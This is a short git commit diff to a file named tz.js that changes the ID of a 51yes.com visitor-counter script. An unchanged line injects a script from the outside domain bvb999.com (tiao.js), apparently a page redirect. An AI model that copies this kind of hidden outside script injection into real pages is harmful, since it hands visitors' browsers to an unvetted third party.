5267ff0e81624c5fc4f6b5f6e3f66299cd234021
js88888888 <jsjsjs888@outlook.com>
2016-01-17 21:18:52 +0800

    Update tz.js

--- dfzq1/5/tz.js
+++ dfzq1/5/tz.js
@@ -1,4 +1,4 @@
-document.writeln("<script language=\"javascript\" src=\"http:\/\/count38.51yes.com\/click.aspx?id=383530534&logo=12\" charset=\"gb2312\"><\/script>");
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count51.51yes.com\/click.aspx?id=512386621&logo=12\" charset=\"gb2312\"><\/script>");
 
 
 document.writeln("<script src=http:\/\/\www.bvb999.com\/dfzq1/tiao.js ><\/script>");
